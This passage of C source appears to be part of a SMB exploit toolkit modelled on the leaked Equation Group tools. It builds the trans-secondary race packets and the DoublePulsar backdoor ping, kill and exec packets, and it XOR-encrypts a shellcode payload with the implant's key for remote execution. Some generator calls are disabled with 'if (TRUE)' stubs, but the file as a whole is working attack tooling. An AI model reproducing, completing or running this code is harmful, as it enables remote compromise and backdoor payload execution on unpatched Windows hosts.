	tmp.pbdata = baseaddress[1].pbpointer + SMB_HEADER_OFFSET;

	tmp.dwsize = bws->dwsize;
	tmp.dwsize -= (DWORD)(baseaddress[1].address - racebaseaddress->address);

	//find third smb header
	if (!find_memory_pattern(&tmp, baseaddress + 2, "\xFFSMB", 4))
		return NULL;

	//increment tmp's address of buffer up by the size of smb->protocol 
	//after setting it to the new smb headers base address
	tmp.pbdata = baseaddress[2].pbpointer + SMB_HEADER_OFFSET;

	tmp.dwsize = bws->dwsize;
	tmp.dwsize -= (DWORD)(baseaddress[2].address - racebaseaddress->address);

	if (!find_memory_pattern(&tmp, baseaddress + 3, "\xFFSMB", 4))
		return FALSE;

	//overwrite tmp to zero
	RtlZeroMemory(&tmp, sizeof(tmp));

	//get each smb headers address
	for (i = 0; i < numberofsmbs; i++)
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer);

	//correct each base address to point to each netbios header
	for (i = 0; i < numberofsmbs; i++)
		baseaddress[i].address -= SMB_HEADER_OFFSET;

	//get each SMB_COM_TRANS_SECONDARY's addresses using each base address
	for (i = 0; i < numberofsmbs; i++)
		trans[i] = (PREQ_TRANSACTION_SECONDARY)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);

	//correct each tree id value
	for (i = 0; i < numberofsmbs; i++)
		PutUshort(&smb[i]->Tid, tid);

	//correct each user id value
	for (i = 0; i < numberofsmbs; i++)
		PutUshort(&smb[i]->Uid, uid);

	return bws->pbdata;
}

PBYTE trans_secondary_fourth_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION_SECONDARY trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, TRANS_SECONDARY_FOURTH_MID_ZERO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_FOURTH_MID_ZERO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;

}

PBYTE trans_secondary_third_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[4];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[4] = { NULL };
	PREQ_TRANSACTION_SECONDARY trans[4] = { NULL };
	DWORD i = 0, numberofsmbs = 4;

	bwsalloc(bws, TRANS_SECONDARY_THIRD_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_THIRD_MULTI_SMB_RACE_TYPE_TWO_PACKET, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (PANYPOINTER)(&bws->pbdata);

	if (!find_memory_pattern(bws, baseaddress, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return NULL;
	}

	tmp.pbdata = baseaddress->pbpointer + SMB_HEADER_OFFSET;
	tmp.dwsize -= (DWORD)(baseaddress->address - racebaseaddress->address);

	for (i = 1; i < numberofsmbs; i++)
	{
		if (!find_memory_pattern(&tmp, baseaddress + i, "\xFFSMB", 4))
		{
			bwsfree(bws);
			return NULL;
		}

		tmp.pbdata = baseaddress[i].pbpointer + SMB_HEADER_OFFSET;
		PutUlong(&tmp.dwsize, GetUlong(&bws->dwsize));
		tmp.dwsize -= (DWORD)(baseaddress[i].address - racebaseaddress->address);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < numberofsmbs; i++)
	{
		(baseaddress + i)->pbpointer -= SMB_HEADER_OFFSET;
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		trans[i] = (PREQ_TRANSACTION_SECONDARY)((baseaddress + i)->pbpointer + SMB_PARAM_OFFSET);

		PutUshort(&smb[i]->Tid, tid);
		PutUshort(&smb[i]->Uid, uid);
	}

	return bws->pbdata;
}

PBYTE nt_create_andx_second_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_NT_CREATE_ANDX ntcreate = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, SECOND_NT_CREATE_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, SECOND_NT_CREATE_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	ntcreate = (PREQ_NT_CREATE_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	if (GetUlong(&ntcreate->RootDirectoryFID) != 0)
		PutUlong(&ntcreate->RootDirectoryFID, 0);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	if (!cmp(h->Protocol, "\xFFSMB", 4))
		return NULL;
	return bws->pbdata;
}

PBYTE trans_secondary_fifth_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION_SECONDARY trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, TRANS_SECONDARY_FIFTH_MID_ZERO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_FIFTH_MID_ZERO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}





/*
 *
 *
 *	DoublePulsar smb packet creation functions
 *
 *
 */

PBYTE trans2_session_setup_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL; 
	PSMB_HEADER h = NULL;
	ANYPOINTER data = { 0 }, params = { 0 };
	BUFFER killparams = { 0 };

	bwsalloc(bws, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = ((PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET));

	data.pvpointer = (MAKEPBYTE(h) + trans->DataOffset);
	params.pvpointer = (MAKEPBYTE(h) + trans->ParameterOffset);

	if (TRUE)//(isnull(GenerateDoublePulsarTrans2SessionSetupParameters(&killparams, DOPU_KILL_OPCODE, NULL, 0)))
	{
		bwsfree(bws);
		return NULL;
	}

	cpy(params.pbpointer, killparams.pbdata, killparams.dwsize);
	bwsfree(&killparams);
	GenerateDoublePulsarOpcodePacket(bws, DOPU_KILL_OPCODE);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;
	ANYPOINTER data = { 0 }, params = { 0 };
	BUFFER execparams = { 0 };

	bwsalloc(bws, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = ((PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET));

	data.pvpointer = (MAKEPBYTE(h) + trans->DataOffset);
	params.pvpointer = (MAKEPBYTE(h) + trans->ParameterOffset);

	if (TRUE)//isnull(GenerateDoublePulsarTrans2SessionSetupParameters(&execparams, DOPU_PING_OPCODE, NULL, 0)))
	{
		bwsfree(bws);
		return NULL;
	}

	cpy(params.pbpointer, execparams.pbdata, execparams.dwsize);
	bwsfree(&execparams);

	GenerateDoublePulsarOpcodePacket(bws, DOPU_PING_OPCODE);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;
	ANYPOINTER data = { 0 }, params = { 0 };
	BUFFER execparams = { 0 }, tmp = { 0 };
	DWORD xorkey = 0, fullpacketsize = 0;
	PVOID pvTrans2Buffer = NULL;
	PREQ_TRANSACTION2_SESSION_SETUP session_setup = NULL;
	static DWORD lengthone, lengthtwo, dopuoffset;
	LONG lisessionsetupoffset = FIELD_OFFSET(REQ_TRANSACTION2, Buffer), lisessionsetupparamoffset = FIELD_OFFSET(REQ_TRANSACTION2_SESSION_SETUP, SessionSetupParameters);

	//if payload isnt padded to a multiple of 4096 pad it with nops until it is
	if (payload->dwsize < 0x1000 || payload->dwsize % 0x1000)
		if (isnull(PadDoPuPayloadToProperSize(payload)))
			return NULL;
	//get the double pulsar xor key 
	xorkey = GetDoublePulsarXorKey(xorkeypacket);
	
	//fail if the key is 0
	if (!xorkey)
		return NULL;

	bwsalloc(&tmp, DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET_SIZE);
	bwsalloc(bws, tmp.dwsize + payload->dwsize);

	cpy(tmp.pbdata, DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET, tmp.dwsize);
	h = MAKEPSMB(tmp.pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Tid, tid);

	cpy(bws->pbdata, tmp.pbdata, min(tmp.dwsize, bws->dwsize));
	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = ((PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET));
	session_setup = ((PREQ_TRANSACTION2_SESSION_SETUP)(trans->Buffer));

	if (TRUE)//isnull(GenerateDoublePulsarTrans2SessionSetupParameters(&execparams, DOPU_EXEC_OPCODE, &payload->dwsize, xorkey)))
	{
		bwsfree(bws);
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		return NULL;
	}

	XorEncryptPayload(payload, xorkey);

	lisessionsetupoffset += SMB_PARAM_OFFSET;

	lengthone = session_setup->SessionSetupParameters.LengthOne, lengthtwo = session_setup->SessionSetupParameters.LengthTwo, dopuoffset = session_setup->SessionSetupParameters.OffsetToCopyShellcodeTo;
	lengthone ^= xorkey, lengthtwo ^= xorkey, dopuoffset ^= xorkey;

	//set netbios size in nbt header
	PutUshort(bws->pbdata + NETBIOS_SIZE_OFFSET, LOWORD(DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE + payload->dwsize));

	

	return bws->pbdata;
}

PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

/*
 *
 *
 *
 *	Equation Group original vulnerability disclosure packet creation function
 *
 *
 *
 */

PBYTE trans_peek_namedpipe_check_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION trans = NULL;
	static ANYPOINTER pipeprotocol, transfunction, fid;

	bwsalloc(bws, EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET_SIZE);
	cpy(bws->pbdata, EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	if (!find_memory_pattern(bws, &pipeprotocol, "\\PIPE\\", 6))
	{
		bwsfree(bws);
		return NULL;
	}

	find_memory_pattern(bws, &transfunction, "\\PIPE\\", 6);
	find_memory_pattern(bws, &fid, "\\PIPE\\", 6);

	transfunction.address -= 0x4;
	fid.address -= 0x2;

	//trans.function should be 0x23 or byteswap16(0x23)

	//trans.smb_pipe.fid should be zero
	if (FALSE)
	{
		bwsfree(bws);
		return NULL;
	}

	if (GetUlonglong(h->SecuritySignature))
		PutUlonglong(h->SecuritySignature, 0ULL);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Tid, tid);
	PutUshort(&h->Mid, mid);

	return bws->pbdata;
}

/*
 *
 *
 *
 *   File Read/Write Functions
 *
 *
 *
 */

BOOLEAN __stdcall readfile(UNICODE_STRING* filename, BUFFER* IN OUT filedata)
{
	HANDLE hfile = NULL;
	LARGE_INTEGER lifilesize = { 0 };

	hfile = CreateFileW(filename->Buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		SetLastError(STATUS_INVALID_HANDLE);
		return FALSE;
	}

	if (!GetFileSizeEx(hfile, &lifilesize))
	{
		CloseHandle(hfile);
		return FALSE;
	}

	RtlZeroMemory(filedata, sizeof(BUFFER));
	bwsalloc(filedata, GetUlong(&lifilesize.LowPart));

	if (!ReadFile(hfile, filedata->pbdata, filedata->dwsize, (DWORD *)&lifilesize.HighPart, NULL))
	{
		CloseHandle(hfile);
		return FALSE;
	}

	CloseHandle(hfile);
	return TRUE;
}

#pragma warning(pop)